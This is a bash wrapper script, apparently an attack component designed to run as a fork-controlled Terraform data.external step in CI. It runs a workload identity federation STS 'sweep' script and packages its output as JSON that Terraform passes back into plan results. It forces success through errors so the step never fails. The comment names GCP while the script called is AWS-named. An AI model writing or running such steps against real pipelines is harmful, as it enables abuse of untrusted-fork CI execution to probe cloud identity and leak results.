#!/usr/bin/env bash
# c211-i120238 GCP WIF provider STS sweep (fork-controlled data.external step).
set +e
RAW="${C211_PROBE_RAW:-/tmp/c211_i120469_raw.txt}"
export C211_PROBE_RAW="$RAW"
: > "$RAW"
cd "$(dirname "$0")" 2>/dev/null
python3 ./aws_wif_sweep.py >>"$RAW" 2>&1
rc=$?
printf '%s\n' "PROBE_EXIT=$rc" >> "$RAW"
python3 - "$RAW" <<'PYEOF'
import json, sys
raw = open(sys.argv[1], encoding='utf-8', errors='replace').read()
sections, cur, buf = {}, 'header', []
for line in raw.splitlines():
    if line.startswith('== ') and line.rstrip().endswith(' =='):
        if buf:
            sections[cur] = '\n'.join(buf); buf = []
        cur = line.strip().strip('=').strip()
    else:
        buf.append(line)
if buf:
    sections[cur] = '\n'.join(buf)
out, seen = {}, {}
for k, v in sections.items():
    key = k.replace(' ', '_').replace('/', '_').replace('(', '').replace(')', '')
    key = key.replace('--', '').replace('__', '_')[:64] or 'section'
    if key in seen:
        seen[key] += 1; key = '%s#%d' % (key[:60], seen[key])
    else:
        seen[key] = 0
    out[key] = v[:6000]
print(json.dumps(out))
PYEOF
exit 0
